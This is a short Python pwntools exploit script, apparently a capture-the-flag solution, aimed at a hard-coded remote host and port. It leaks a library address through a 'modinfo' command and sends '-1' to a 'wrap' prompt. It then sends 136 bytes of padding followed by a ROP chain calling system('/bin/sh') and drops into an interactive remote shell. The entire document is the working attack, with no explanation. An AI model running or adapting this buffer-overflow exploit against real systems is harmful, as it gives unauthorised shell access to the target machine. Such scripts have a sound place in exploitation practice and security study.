
from pwn import *


# host = "localhost"
# port = "12345"

host = "35.198.185.193"
port = "1341"


offset = 136
shell_offset = 0x202000 + 0x001a3ee0
system_offset = 0x202000 + 0x00047dc0


io = remote(host, port)
io.recvuntil('> ')
io.send("modinfo\n")

addr = int(io.recvuntil('> ').split('\n')[3].split(':')[1], 16)


io.send("wrap\n")
io.recvuntil('|> ')
io.send('-1\n')

io.recvuntil('|> ')


rop = p64(0x0000000000401550)  # pop rdi ; ret
rop += p64(addr + shell_offset)
rop += p64(addr + system_offset)

io.send("A" * offset + rop + "\n")

io.interactive()
io.close()
